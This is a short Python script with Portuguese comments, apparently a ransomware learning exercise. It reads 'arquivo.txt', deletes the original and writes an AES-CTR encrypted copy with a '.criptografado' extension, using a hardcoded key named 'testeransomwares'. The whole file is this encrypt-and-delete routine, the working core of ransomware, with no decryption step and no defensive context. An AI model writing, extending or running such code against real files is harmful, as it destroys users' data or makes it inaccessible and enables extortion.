import os
import pyaes

#Abrir o arquivo, ler, armazenar os dados em uma variável e em seguida o excluir.
file_name = "arquivo.txt"
file = open(file_name, 'rb')
file_data = file.read()
file.close()
os.remove(file_name)

#Definindo a chave de criptografia.
key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

#Criptografando o arquivo.
crypto_data = aes.encrypt(file_data)

#Criando novo arquivo.
new_file = file_name + ".criptografado"
new_file = open(f'{new_file}', 'wb')
new_file.write(crypto_data)
new_file.close()
